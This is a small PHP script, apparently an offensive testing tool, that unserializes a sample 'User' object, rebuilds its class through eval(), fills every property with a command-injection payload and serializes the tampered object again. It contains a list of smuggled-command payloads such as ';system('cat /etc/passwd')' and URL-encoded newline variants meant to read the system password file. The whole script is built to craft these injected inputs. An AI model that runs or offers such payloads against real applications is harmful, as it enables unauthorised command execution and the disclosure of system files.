<?php
function modifyData($serializedData, $payloads) {

    $unserializedObject = unserialize($serializedData);

    echo "Serialized data: " . $serializedData . PHP_EOL;

    $matches = [];
    preg_match('/^O:\d+:"([^"]+)"/', $serializedData, $matches);
    $className = $matches[1] ?? '';

    $properties = get_object_vars($unserializedObject);

    echo "ClassName: " . $className . PHP_EOL;
    echo "Properties: ";
    var_dump($properties) . PHP_EOL;

    $dynamicClass = "class $className {\n";
    foreach ($properties as $property => $value) {
        if ($property !== '__PHP_Incomplete_Class_Name') {
            $dynamicClass .= "    public $$property;\n";
        }
    }
    $dynamicClass .= "}\n";
    echo $dynamicClass . PHP_EOL;
    eval($dynamicClass);

    $newObject = new $className();

    foreach ($properties as $property => $value) {
        if ($property !== '__PHP_Incomplete_Class_Name') {
            $newObject->$property = $payloads[0];
        }
    }

    $modifiedSerializedData = serialize($newObject);

    return $modifiedSerializedData;
}

$serializedData = 'O:4:"User":2:{s:4:"name";s:4:"John";s:5:"email";s:16:"john@example.com";}';
$payloads = [
    ';system(\'cat%20/etc/passwd\')',
    '%0Acat%20/etc/passwd',
    ';cat /etc/passwd',
    ';system(\'cat /etc/passwd\')',
    ';head -25 /etc/passwd',
    ';head%20-25%20/etc/passwd'
];

$newObject = modifyData($serializedData, $payloads);

echo "Modified Serialized data: " . $newObject . PHP_EOL;

$modifiedProperties = get_object_vars(unserialize($newObject));
echo "Properties after modification: ";
var_dump($modifiedProperties);
